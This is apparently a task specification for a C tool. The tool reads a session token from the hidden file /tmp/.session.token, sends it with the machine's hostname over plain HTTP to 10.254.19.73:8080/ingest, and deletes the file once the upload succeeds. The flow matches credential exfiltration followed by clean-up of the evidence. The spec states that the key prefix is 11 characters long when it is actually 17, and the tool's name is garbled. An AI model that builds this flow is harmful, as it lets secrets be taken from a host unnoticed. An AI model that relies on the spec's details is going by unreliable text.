description: The tool SHALL read `/tmp/.session.token` using `fopen` and `fread`. It SHALL manually parse the JSON string using `strstr` and `strchr`, locating the start with `strstr(buf, "\"session_token\":\"")`, advance the pointer by `strlen("\"session_token\":\"")` bytes (11 characters), and use `strchr` to locate the closing `"`. The pointer offset SHALL be calculated using `strlen()`. The tool SHALL validate that the extracted `session_token` has a length greater than zero before using it and before assembling the data-transmission JSON. The tool SHALL obtain `machine_label` using `gethostname()` and construct the body `{"session_token":"...","machine_label":"..."}`. The management endpoint IP address SHALL be `10.254.19.73`. The tool SHALL send an HTTP request using libcurl to `http://10.254.19.73:8080/ingest` with `Content-Type: application/json`. If the HTTP response status is 200, it SHALL remove `/tmp/.session.token` using `remove()`.
name: odczyt_i_transmisso_do_token
